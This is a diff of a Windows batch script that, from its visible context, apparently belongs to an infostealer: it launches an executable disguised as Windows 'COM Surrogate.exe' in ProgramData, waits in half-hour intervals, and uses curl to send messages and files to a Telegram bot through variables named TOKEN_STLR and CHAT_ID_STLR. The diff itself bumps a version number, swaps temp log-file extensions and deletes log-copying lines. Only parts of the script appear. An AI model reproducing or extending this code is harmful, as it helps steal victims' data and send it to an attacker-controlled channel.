@@ -3,7 +3,7 @@
 
 setlocal enabledelayedexpansion
 
-set "BATCHVERSION=1.8"
+set "BATCHVERSION=1.9"
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
@@ -16,7 +16,7 @@ for /L %%i in (1,1,13) do (
 )
 set "filename1=!filename!"
 set "filename="
-set "LOGFILE=%temp%\!filename1!.mseuop"
+set "LOGFILE=%temp%\!filename1!.mseuope"
 
 
 
@@ -26,7 +26,7 @@ for /L %%i in (1,1,13) do (
 )
 set "filename2=!filename!"
 set "filename="
-set "LOGFILE1=%temp%\!filename2!.mseuope"
+set "LOGFILE1=%temp%\!filename2!.mseuop"
 
 
 
@@ -80,7 +80,7 @@ if %errorlevel% neq 0 (
 )
 
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 
 
@@ -98,7 +98,7 @@ echo.
 echo Sended
 echo.
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 echo.
 echo Waiting 1800 seconds
@@ -114,7 +114,7 @@ start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 echo Started
 
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
      -d "chat_id=%CHAT_ID_STLR%" ^
@@ -172,7 +172,7 @@ echo.
 
 
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 
 echo.
@@ -202,7 +202,7 @@ echo.
 
 
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 
 echo.
@@ -231,7 +231,7 @@ echo Sended
 echo.
 
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 
 echo.
@@ -260,7 +260,7 @@ echo Sended
 echo.
 
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 echo.
 echo Waiting Last 1800 seconds
@@ -269,7 +269,7 @@ echo.
 echo.
 
 echo Sending msg..
-type "%LOGFILE%" >> "%LOGFILE1%"
+
 
 
 
@@ -284,4 +284,4 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendDocument" ^
 
 echo SentSuccess
 
-type "%LOGFILE%" >> "%LOGFILE1%"
+
